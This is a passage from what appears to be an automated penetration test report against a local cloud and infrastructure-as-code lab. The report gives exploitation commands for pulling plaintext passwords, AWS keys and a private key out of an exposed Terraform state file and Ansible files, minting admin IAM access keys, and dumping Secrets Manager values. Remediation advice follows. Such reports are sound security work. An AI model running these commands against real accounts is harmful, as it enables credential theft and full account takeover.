This finding demonstrates a concrete privilege escalation path. Using the root account, we were able to create a new programmatic access key for the ci-deploy IAM user which has AdministratorAccess. The newly minted credentials (AccessKeyId: [REDACTED_AWS_KEY_ID]) were verified to authenticate as the ci-deploy user via STS GetCallerIdentity, confirming full admin access. This attack path is critical because any IAM principal with iam:CreateAccessKey permission on the ci-deploy user can gain full account admin access by minting new credentials. The proof key was deleted after verification to maintain responsible testing practices.

#### Exploitation Commands

```bash
aws --endpoint-url http://localhost:4566 iam create-access-key --user-name ci-deploy
aws --endpoint-url http://localhost:4566 sts get-caller-identity (with minted credentials)
aws --endpoint-url http://localhost:4566 iam delete-access-key --user-name ci-deploy --access-key-id [REDACTED_AWS_KEY_ID]
```

#### Raw Request

```http
aws --endpoint-url http://localhost:4566 iam create-access-key --user-name ci-deploy
```

#### Raw Response

```http
{"AccessKey":{"UserName":"ci-deploy","AccessKeyId":"[REDACTED_AWS_KEY_ID]","Status":"Active","SecretAccessKey":"[REDACTED_AWS_SECRET]","CreateDate":"2026-08-01T19:44:31Z"}}
```

#### Evidence / Logs

```
iam create-access-key returned: AccessKeyId=[REDACTED_AWS_KEY_ID], SecretAccessKey=[REDACTED_AWS_SECRET], Status=Active
sts get-caller-identity (with new key) returned: UserId=eb306jvyzo4a6z1zuw5l, Account=000000000000, Arn=arn:aws:iam::000000000000:user/ci-deploy
iam delete-access-key succeeded: proof key cleaned up
```

#### Remediation

1. Remove AdministratorAccess from ci-deploy and replace with least-privilege policy. 2. Add IAM policy conditions to deny iam:CreateAccessKey unless from a known secure admin workstation. 3. Enable AWS Config rules to detect overly permissive IAM policies. 4. Implement SCPs at the organization level to restrict iam:CreateAccessKey. 5. Use IAM Access Analyzer to identify overly-permissive access.

---

### 3.10 — Unauthenticated Terraform Remote State Backend - Full Plaintext Secrets Exposure

| Field | Value |
|-------|-------|
| **ID** | `vuln_63dcd4` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `http://127.0.0.1:8888/terraform.tfstate` |
| **Discovered by** | `terraform` |
| **Discovered at** | 2026-08-01T19:48:23Z |

#### Description

The Terraform HTTP state backend at port 8888 serves the terraform.tfstate file without any authentication. The state file (719 bytes, Terraform v1.7.0, state version 4) contains 3 resources with plaintext secrets: (1) aws_iam_access_key.ci with active Access Key ID AKIAXXXXXXXXXXREDACTED and Secret Key [REDACTED]; (2) aws_db_instance.prod with RDS credentials dbadmin/Pr0dDBpassw0rd! at prod-db.abc123.eu-west-1.rds.amazonaws.com:5432; (3) tls_private_key.deploy with full RSA private key PEM. Directory listing is also enabled at the root path.

#### Technical Analysis

A simple unauthenticated HTTP GET returns the full Terraform state file containing 3 resources with plaintext secrets including AWS IAM keys, RDS database passwords, and a TLS private key.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8888/terraform.tfstate
```

#### Evidence / Logs

```
HTTP/1.0 200 OK\nContent-Type: application/json\nContent-Length: 719\n\n{\"version\":4,\"terraform_version\":\"1.7.0\",\"resources\":[{\"mode\":\"managed\",\"type\":\"aws_db_instance\",\"name\":\"prod\",...password:\"Pr0dDBpassw0rd!\"...},{\"type\":\"aws_iam_access_key\",\"name\":\"ci\",...secret:\"[REDACTED]\"...},{\"type\":\"tls_private_key\",\"name\":\"deploy\",...private_key_pem:\"-----BEGIN RSA PRIVATE KEY-----\\nMIIFAKEDEPLOYKEYdeadbeef...\"...}]}
```

#### Remediation

1. Encrypt state at rest using a backend that supports encryption (S3+KMS, GCS, Terraform Cloud). 2. Require authentication for state access. 3. Use sensitive = true on all credential outputs. 4. Rotate all exposed credentials immediately: AWS IAM key, RDS password, TLS private key. 5. Disable directory listing.

---

### 3.11 — AWS IAM Access Key Leaked in Terraform State - Active Credentials

| Field | Value |
|-------|-------|
| **ID** | `vuln_afc049` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1528` — Steal Application Access Token |
| **ISO 27001** | `A.9.2.4` |
| **Endpoint** | `http://127.0.0.1:8888/terraform.tfstate` |
| **Discovered by** | `terraform` |
| **Discovered at** | 2026-08-01T19:48:30Z |

#### Description

Active AWS IAM access key for user 'ci' leaked in terraform.tfstate: Access Key ID = AKIAXXXXXXXXXXREDACTED, Secret Access Key = [REDACTED], Status = Active. These credentials enable full AWS API access with whatever permissions the IAM user has.

#### Technical Analysis

The aws_iam_access_key.ci resource in the state file contains the plaintext Access Key ID and Secret Access Key in Active status.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8888/terraform.tfstate | jq '.resources[] | select(.type==\"aws_iam_access_key\")'
```

#### Remediation

1. Immediately rotate the IAM access key. 2. Audit CloudTrail for unauthorized use. 3. Use IAM roles instead of long-lived access keys. 4. Never store access keys in Terraform state - use dynamic credentials via AWS SSO or STS.

---

### 3.12 — IAM User ci-deploy with AdministratorAccess - Full AWS Account Takeover

| Field | Value |
|-------|-------|
| **ID** | `vuln_9f38c6` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `http://localhost:4566 (IAM - ci-deploy)` |
| **Discovered by** | `aws` |
| **Discovered at** | 2026-08-01T19:49:11Z |

#### Description

IAM user 'ci-deploy' (arn:aws:iam::000000000000:user/ci-deploy) has the AWS-managed AdministratorAccess policy attached, granting unrestricted *:* permissions across all AWS services. The user has an active access key ([REDACTED_AWS_KEY_ID]). This constitutes a full AWS account compromise vector - any CI/CD system using these credentials has unrestricted admin access.

#### Technical Analysis

IAM enumeration reveals a single user 'ci-deploy' with AdministratorAccess attached and an active long-lived access key - a textbook over-privileged CI/CD service account.

#### Exploitation Commands

```bash
bash -c "AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1 aws --endpoint-url http://localhost:4566 iam list-users"\nbash -c "AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1 aws --endpoint-url http://localhost:4566 iam list-attached-user-policies --user-name ci-deploy"\nbash -c "AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1 aws --endpoint-url http://localhost:4566 iam list-access-keys --user-name ci-depl
```

#### Evidence / Logs

```
$ aws iam list-attached-user-policies --user-name ci-deploy\nAttachedPolicies: [{\"PolicyName\":\"AdministratorAccess\",\"PolicyArn\":\"arn:aws:iam::aws:policy/AdministratorAccess\"}]\n\n$ aws iam list-access-keys --user-name ci-deploy\nAccessKeyMetadata: [{\"AccessKeyId\":\"[REDACTED_AWS_KEY_ID]\",\"Status\":\"Active\"}]
```

#### Remediation

1. Replace AdministratorAccess with least-privilege policy scoped to only required CI/CD actions. 2. Implement SCP guardrails at the Organization level. 3. Require MFA for IAM user console access. 4. Use IAM roles with temporary credentials (STS AssumeRole) instead of long-lived access keys. 5. Enable CloudTrail to audit all API calls.

---

### 3.13 — IAM Privilege Escalation - iam:CreateAccessKey Exploited for Admin Key Minting

| Field | Value |
|-------|-------|
| **ID** | `vuln_b69d1f` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1098.001` — Account Manipulation: Additional Cloud Credentials |
| **ISO 27001** | `A.9.2.5` |
| **Endpoint** | `http://localhost:4566 (IAM - CreateAccessKey)` |
| **Discovered by** | `aws` |
| **Discovered at** | 2026-08-01T19:49:27Z |

#### Description

Demonstrated IAM privilege escalation by creating a new access key for the admin-level ci-deploy user. New key minted: AccessKeyId=[REDACTED_AWS_KEY_ID], SecretAccessKey=[REDACTED_AWS_SECRET]. Verified the new key authenticates as ci-deploy with full AdministratorAccess. The key was cleaned up after proof. This proves an attacker can mint persistent admin credentials at will.

#### Technical Analysis

Exploited iam:CreateAccessKey to mint a new admin-level access key for ci-deploy, verified it works via sts:GetCallerIdentity, then cleaned up the proof key.

#### Exploitation Commands

```bash
bash -c \"AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1 aws --endpoint-url http://localhost:4566 iam create-access-key --user-name ci-deploy\"\nbash -c \"AWS_ACCESS_KEY_ID=[REDACTED_AWS_KEY_ID] AWS_SECRET_ACCESS_KEY=[REDACTED_AWS_SECRET] AWS_DEFAULT_REGION=us-east-1 aws --endpoint-url http://localhost:4566 sts get-caller-identity\"
```

#### Evidence / Logs

```
$ aws iam create-access-key --user-name ci-deploy\n{\"AccessKey\":{\"UserName\":\"ci-deploy\",\"AccessKeyId\":\"[REDACTED_AWS_KEY_ID]\",\"SecretAccessKey\":\"[REDACTED]\",\"Status\":\"Active\"}}\n\n$ aws sts get-caller-identity (with new key)\n{\"UserId\":\"eb306jvyzo4a6z1zuw5l\",\"Account\":\"000000000000\",\"Arn\":\"arn:aws:iam::000000000000:user/ci-deploy\"}\n\n$ aws iam delete-access-key --user-name ci-deploy --access-key-id [REDACTED_AWS_KEY_ID] (cleanup)
```

#### Remediation

1. Restrict iam:CreateAccessKey to break-glass scenarios only. 2. Implement SCP denying iam:CreateAccessKey for non-admin roles. 3. Alert on CreateAccessKey API calls via CloudTrail + CloudWatch. 4. Limit max access keys per user to 1.

---

### 3.14 — Ansible Inventory Exposes Plaintext SSH Credentials (deploy/Sup3rDeploy! and root/R00tDB!)

| Field | Value |
|-------|-------|
| **ID** | `vuln_44f50e` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `http://127.0.0.1:8890/inventory.ini` |
| **Discovered by** | `ansible` |
| **Discovered at** | 2026-08-01T19:50:01Z |

#### Description

Ansible inventory.ini file served unauthenticated at http://127.0.0.1:8890/inventory.ini contains plaintext SSH credentials for two servers: (1) web01 at IP_PRIVATE_001 - user 'deploy' with password 'Sup3rDeploy!'; (2) db01 at IP_PRIVATE_002 - user 'root' with become password 'R00tDB!'. These credentials enable direct SSH access to both the web and database tiers with root-equivalent privileges.

#### Technical Analysis

Unauthenticated HTTP GET returns the full Ansible inventory with plaintext SSH passwords for web and database servers.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8890/inventory.ini
```

#### Evidence / Logs

```
[web]\nweb01 ansible_host=IP_PRIVATE_001 ansible_user=deploy ansible_ssh_pass=Sup3rDeploy!\n[db]\ndb01 ansible_host=IP_PRIVATE_002 ansible_user=root ansible_become_pass=R00tDB!
```

#### Remediation

1. Remove all plaintext passwords from inventory files immediately. 2. Use Ansible Vault to encrypt sensitive variables. 3. Use SSH key-based authentication instead of passwords. 4. Remove the file server or add authentication. 5. Rotate all exposed passwords: deploy and root.

---

### 3.15 — Ansible Group Vars Expose AWS Keys and Grafana Admin Password in Plaintext

| Field | Value |
|-------|-------|
| **ID** | `vuln_507ee9` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `http://127.0.0.1:8890/group_vars_all.yml` |
| **Discovered by** | `ansible` |
| **Discovered at** | 2026-08-01T19:50:11Z |

#### Description

Ansible group_vars_all.yml served unauthenticated at http://127.0.0.1:8890/group_vars_all.yml contains plaintext secrets despite vault_ prefix naming convention: vault_aws_access_key=AKIAXXXXXXXXXXREDACTED, vault_aws_secret_key=[REDACTED_AWS_SECRET], grafana_admin_password=gr@f4naAdmin. The vault_ prefix suggests these were intended to be encrypted but are stored in plaintext.

#### Technical Analysis

Unauthenticated HTTP GET returns group variables file with AWS credentials and Grafana password in plaintext despite vault_ naming convention suggesting encryption was intended.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8890/group_vars_all.yml
```

#### Evidence / Logs

```
vault_aws_access_key: AKIAXXXXXXXXXXREDACTED\nvault_aws_secret_key: [REDACTED_AWS_SECRET]\ngrafana_admin_password: gr@f4naAdmin
```

#### Remediation

1. Encrypt ALL vault_ prefixed variables with Ansible Vault immediately. 2. Rotate the AWS access key and secret key. 3. Change the Grafana admin password. 4. Store vault password in a secure location, not in the repository. 5. Remove the unauthenticated file server.

---

### 3.16 — Production RDS Database Password Leaked in Terraform State

| Field | Value |
|-------|-------|
| **ID** | `vuln_808082` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.17 - Authentication Information / A.8.24 - Use of Cryptography` |
| **Endpoint** | `http://127.0.0.1:8888/terraform.tfstate` |
| **Component** | aws_db_instance.prod |
| **Discovered by** | `terraform` |
| **Discovered at** | 2026-08-01T19:44:56Z |

#### Description

The Terraform state file contains the production RDS database credentials in plaintext (resource: aws_db_instance.prod). Extracted values — Identifier: prod-db, Username: dbadmin, Password: Pr0dDBpassw0rd!, Endpoint: prod-db.abc123.eu-west-1.rds.amazonaws.com:5432. The port 5432 indicates this is a PostgreSQL instance. An attacker with network access to the RDS endpoint (or able to modify security groups using the leaked IAM key) can connect directly to the production database with administrative privileges and exfiltrate or modify all data.

#### Technical Analysis

The Terraform state file stores the master password for the RDS instance in plaintext because the AWS provider records all attributes returned by the API. The aws_db_instance.prod resource exposes the full connection string: the production database 'prod-db' in eu-west-1 is accessible at prod-db.abc123.eu-west-1.rds.amazonaws.com on port 5432 (PostgreSQL) with username 'dbadmin' and password 'Pr0dDBpassw0rd!'. This gives an attacker direct database administrative access if the RDS security group allows their network. Combined with the leaked IAM key (finding #2), an attacker could modify the RDS security group to allow their IP, then connect with psql using these credentials to dump the entire production database.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8888/terraform.tfstate | jq -r '.resources[] | select(.type=="aws_db_instance") | .instances[].attributes | {identifier,username,password,endpoint}'
```

#### Raw Request

```http
GET /terraform.tfstate HTTP/1.1
Host: 127.0.0.1:8888
```

#### Raw Response

```http
{"mode":"managed","type":"aws_db_instance","name":"prod","instances":[{"attributes":{"identifier":"prod-db","username":"dbadmin","password":"Pr0dDBpassw0rd!","endpoint":"prod-db.abc123.eu-west-1.rds.amazonaws.com:5432"}}]}
```

#### Evidence / Logs

```
Extracted from tfstate path: .resources[0] (type: aws_db_instance, name: prod)
---
Identifier: prod-db
Username: dbadmin
Password: Pr0dDBpassw0rd!
Endpoint: prod-db.abc123.eu-west-1.rds.amazonaws.com:5432
Database engine: PostgreSQL (inferred from port 5432)
```

#### Remediation

1. Immediately rotate the RDS master password via AWS console or CLI. 2. Migrate password management to AWS Secrets Manager with automatic rotation. 3. Use the 'manage_master_user_password' attribute in Terraform (RDS-managed credentials) instead of setting password in HCL. 4. Restrict RDS security group ingress to application subnets only. 5. Enable RDS encryption at rest and in transit. 6. Encrypt the state backend.

---

### 3.17 — Secrets Manager - Production Database Credentials Exposed (prod/db)

| Field | Value |
|-------|-------|
| **ID** | `vuln_799ee7` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1552.005` — Unsecured Credentials: Cloud Instance Metadata API |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `arn:aws:secretsmanager:us-east-1:000000000000:secret:prod/db-LGokXa` |
| **Component** | AWS Secrets Manager |
| **Discovered by** | `aws` |
| **Discovered at** | 2026-08-01T19:45:21Z |

#### Description

Production database credentials are stored in AWS Secrets Manager under the secret name 'prod/db'. The secret was fully extractable using get-secret-value, revealing plaintext credentials: user=admin, password=Pr0dP@ss. Any principal with secretsmanager:GetSecretValue permission (including the ci-deploy user with AdministratorAccess) can retrieve these credentials and gain full access to the production database.

#### Technical Analysis

The AWS Secrets Manager secret 'prod/db' contains production database credentials in plaintext JSON format. The secret value was successfully extracted using the aws secretsmanager get-secret-value command, revealing username 'admin' and password 'Pr0dP@ss'. These credentials could be used to directly access the production database, leading to full data compromise. The secret is accessible to any IAM principal with AdministratorAccess or secretsmanager:GetSecretValue permission, including the ci-deploy service account.

#### Exploitation Commands

```bash
AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1 aws --endpoint-url http://localhost:4566 secretsmanager list-secrets
AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1 aws --endpoint-url http://localhost:4566 secretsmanager get-secret-value --secret-id prod/db
```

#### Raw Request

```http
aws --endpoint-url http://localhost:4566 secretsmanager get-secret-value --secret-id prod/db
```

#### Raw Response

```http
{"ARN":"arn:aws:secretsmanager:us-east-1:000000000000:secret:prod/db-LGokXa","Name":"prod/db","VersionId":"f05e0331-483b-4856-bee9-00d27eb5c38c","SecretString":"{\"user\":\"admin\",\"password\":\"Pr0dP@ss\"}","VersionStages":["AWSCURRENT"],"CreatedDate":1785611268.0}
```

#### Evidence / Logs

```
secretsmanager list-secrets returned: Name=prod/db, ARN=arn:aws:secretsmanager:us-east-1:000000000000:secret:prod/db-LGokXa
secretsmanager get-secret-value returned: SecretString={\"user\":\"admin\",\"password\":\"Pr0dP@ss\"}
```

#### Remediation

1. Rotate the database credentials immediately. 2. Implement least-privilege IAM policies restricting secretsmanager:GetSecretValue to only the services that need it. 3. Enable automatic secret rotation. 4. Add resource-based policies to the secret restricting access. 5. Enable CloudTrail logging for Secrets Manager API calls.

---

### 3.18 — Production RDS Database Password Leaked in Terraform State

| Field | Value |
|-------|-------|
| **ID** | `vuln_d5b2a6` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `http://127.0.0.1:8888/terraform.tfstate` |
| **Discovered by** | `terraform` |
| **Discovered at** | 2026-08-01T19:48:36Z |

#### Description

Production PostgreSQL RDS credentials leaked in terraform.tfstate: identifier=prod-db, username=dbadmin, password=Pr0dDBpassw0rd!, endpoint=prod-db.abc123.eu-west-1.rds.amazonaws.com:5432. Direct database access is possible if the RDS instance is network-reachable.

#### Technical Analysis

The aws_db_instance.prod resource exposes production PostgreSQL credentials including username, password, and full endpoint.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8888/terraform.tfstate | jq '.resources[] | select(.type==\"aws_db_instance\")'
```

#### Remediation

1. Rotate the RDS master password immediately. 2. Use AWS Secrets Manager for RDS credential rotation. 3. Reference secrets from a vault in Terraform, never store plaintext passwords in state.

---

### 3.19 — AWS Secrets Manager - Production Database Credentials Extracted (admin/Pr0dP@ss)

| Field | Value |
|-------|-------|
| **ID** | `vuln_13cc6e` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1552.005` — Unsecured Credentials: Cloud Instance Metadata API |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `http://localhost:4566 (AWS Secrets Manager - prod/db)` |
| **Discovered by** | `aws` |
| **Discovered at** | 2026-08-01T19:48:58Z |

#### Description

AWS Secrets Manager secret 'prod/db' (ARN: arn:aws:secretsmanager:us-east-1:000000000000:secret:prod/db-LGokXa) contains production database credentials in plaintext JSON: {\"user\": \"admin\", \"password\": \"Pr0dP@ss\"}. Any IAM principal with secretsmanager:GetSecretValue permission can extract these credentials.

#### Technical Analysis

Using the test credentials, we enumerated Secrets Manager and extracted the prod/db secret containing production database admin credentials in plaintext.

#### Exploitation Commands

```bash
bash -c "AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1 aws --endpoint-url http://localhost:4566 secretsmanager list-secrets"\nbash -c "AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1 aws --endpoint-url http://localhost:4566 secretsmanager get-secret-value --secret-id prod/db"
```

#### Evidence / Logs

```
$ aws secretsmanager get-secret-value --secret-id prod/db\n{\n    \"ARN\": \"arn:aws:secretsmanager:us-east-1:000000000000:secret:prod/db-LGokXa\",\n    \"Name\": \"prod/db\",\n    \"SecretString\": \"{\\\"user\\\": \\\"admin\\\", \\\"password\\\": \\\"Pr0dP@ss\\\"}\",\n    \"VersionStages\": [\"AWSCURRENT\"]\n}
```

#### Remediation

1. Enable automatic rotation for the secret. 2. Restrict secretsmanager:GetSecretValue via IAM policies to only services that need it. 3. Enable CloudTrail logging for secret access. 4. Rotate the database password immediately.

---

### 3.20 — TLS/RSA Private Key Leaked in Terraform State — Deploy Key Compromise

| Field | Value |
|-------|-------|
| **ID** | `vuln_27c44b` |
| **Severity** | CRITICAL |
| **CVSS Score** | 8.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.004` — Unsecured Credentials: Private Keys |
| **ISO 27001** | `A.8.24 - Use of Cryptography / A.5.17 - Authentication Information` |
| **Endpoint** | `http://127.0.0.1:8888/terraform.tfstate` |
| **Component** | tls_private_key.deploy |
| **Discovered by** | `terraform` |
| **Discovered at** | 2026-08-01T19:45:17Z |

#### Description

The Terraform state file contains a full RSA private key in PEM format (resource: tls_private_key.deploy). The private_key_pem attribute stores the complete key: -----BEGIN RSA PRIVATE KEY-----\nMIIFAKEDEPLOYKEYdeadbeef\n-----END RSA PRIVATE KEY-----. The resource name 'deploy' indicates this key is used for deployment operations — likely SSH access to servers, git deploy keys, or TLS mutual authentication. An attacker possessing this private key can impersonate the deploy identity, authenticate to any system that trusts the corresponding public key, and potentially gain shell access to production servers or push code to repositories.

#### Technical Analysis

The Terraform tls_private_key resource generates a cryptographic key pair and stores BOTH the private and public key in the state file. The tls_private_key.deploy resource's private_key_pem attribute contains the full RSA private key in PEM format. This is a fundamental design limitation of Terraform — the tls provider must persist the private key in state so it can be referenced by other resources. The resource name 'deploy' strongly suggests this key is used for deployment authentication (SSH deploy keys for EC2 instances, GitHub/GitLab deploy keys, or TLS client certificates). An attacker with this key can impersonate the deployment identity and gain unauthorized access to any system trusting the corresponding public key.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8888/terraform.tfstate | jq -r '.resources[] | select(.type=="tls_private_key") | .instances[].attributes.private_key_pem'
```

#### Raw Request

```http
GET /terraform.tfstate HTTP/1.1
Host: 127.0.0.1:8888
```

#### Raw Response

```http
{"mode":"managed","type":"tls_private_key","name":"deploy","instances":[{"attributes":{"private_key_pem":"-----BEGIN RSA PRIVATE KEY-----\nMIIFAKEDEPLOYKEYdeadbeef\n-----END RSA PRIVATE KEY-----"}}]}
```

#### Evidence / Logs

```
Extracted from tfstate path: .resources[2] (type: tls_private_key, name: deploy)
---
-----BEGIN RSA PRIVATE KEY-----
MIIFAKEDEPLOYKEYdeadbeef
-----END RSA PRIVATE KEY-----
```

#### Remediation

1. Immediately revoke and regenerate the key pair. 2. Remove the tls_private_key resource from Terraform — generate keys externally and import only the public key. 3. Rotate SSH authorized_keys and deploy keys on all servers and repositories that trust this key. 4. Use a secrets manager (HashiCorp Vault, AWS Secrets Manager) for key storage instead of Terraform state. 5. Encrypt state backend. 6. Audit access logs on systems trusting this deploy key for unauthorized access.

---

### 3.21 — TLS/RSA Private Key Leaked in Terraform State

| Field | Value |
|-------|-------|
| **ID** | `vuln_88d458` |
| **Severity** | CRITICAL |
| **CVSS Score** | 8.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1552.004` — Unsecured Credentials: Private Keys |
| **ISO 27001** | `A.10.1.2` |
| **Endpoint** | `http://127.0.0.1:8888/terraform.tfstate` |
| **Discovered by** | `terraform` |
| **Discovered at** | 2026-08-01T19:48:44Z |

#### Description

Full RSA private key PEM for the 'deploy' identity leaked in terraform.tfstate via tls_private_key.deploy resource. The private key begins with -----BEGIN RSA PRIVATE KEY----- MIIFAKEDEPLOYKEYdeadbeef. This key could be used to impersonate the deploy identity for SSH or TLS authentication to any system trusting the corresponding public key.

#### Technical Analysis

The tls_private_key.deploy resource stores the full RSA private key PEM in plaintext within the Terraform state file.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8888/terraform.tfstate | jq '.resources[] | select(.type==\"tls_private_key\")'
```

#### Remediation

1. Revoke the deploy key immediately. 2. Generate a new key pair and redistribute the public key. 3. Use external key management (KMS, Vault) instead of tls_private_key resources. 4. If using tls_private_key, ensure state is encrypted.

---

### 3.22 — Plaintext Grafana Admin Password in Group Variables

| Field | Value |
|-------|-------|
| **ID** | `vuln_ccac06` |
| **Severity** | HIGH |
| **CVSS Score** | 8.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.33` |
| **Endpoint** | `http://127.0.0.1:8890/group_vars_all.yml` |
| **Component** | Grafana |
| **Discovered by** | `ansible` |
| **Discovered at** | 2026-08-01T19:45:11Z |

#### Description

The group_vars_all.yml file contains a plaintext Grafana admin password: grafana_admin_password: gr@f4naAdmin. This credential grants administrative access to the Grafana monitoring platform, which typically provides access to all monitored infrastructure metrics, dashboards, data sources (which often include database connection strings), and potentially alerting configurations. An attacker with Grafana admin access can view all infrastructure telemetry data and potentially pivot through configured data sources to access databases directly.

#### Technical Analysis

The group_vars_all.yml file contains a Grafana administrative password stored in plaintext as grafana_admin_password: gr@f4naAdmin. This variable is applied globally to all hosts (the 'all' group), meaning every host in the inventory has this variable available during playbook execution. The password gr@f4naAdmin grants admin-level access to the Grafana web interface. Grafana admin access exposes all monitoring dashboards, data source configurations (which frequently contain database credentials), user management, and the ability to configure alerting — providing both reconnaissance intelligence and potential pivot points through data source credentials.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8890/group_vars_all.yml
```

#### Raw Request

```http
GET /group_vars_all.yml HTTP/1.1
Host: 127.0.0.1:8890
```

#### Raw Response

```http
vault_aws_access_key: AKIAXXXXXXXXXXREDACTED
vault_aws_secret_key: [REDACTED_AWS_SECRET]
grafana_admin_password: gr@f4naAdmin
```

#### Evidence / Logs

```
grafana_admin_password: gr@f4naAdmin
```

#### Remediation

1. Rotate the Grafana admin password immediately. 2. Store the password in Ansible Vault. 3. Use Grafana's LDAP/OAuth integration instead of a static admin password. 4. Remove the group_vars file from HTTP exposure.

---

### 3.23 — Unauthenticated Directory Listing Exposes Ansible IaC Files

| Field | Value |
|-------|-------|
| **ID** | `vuln_9acfed` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1083` — File and Directory Discovery |
| **ISO 27001** | `A.8.15` |
| **Endpoint** | `http://127.0.0.1:8890/` |
| **Component** | Python http.server |
| **Discovered by** | `ansible` |
| **Discovered at** | 2026-08-01T19:44:12Z |

#### Description

An HTTP file server on port 8890 serves an Ansible Infrastructure-as-Code repository with directory listing enabled and no authentication. Any network-reachable attacker can browse and download all Ansible inventory files, group variables, and playbooks. The directory listing at / explicitly enumerates three files: inventory.ini, group_vars_all.yml, and site.yml. All three were successfully downloaded and contain critical secrets including SSH credentials, database root passwords, AWS keys, and Grafana admin passwords.

#### Technical Analysis

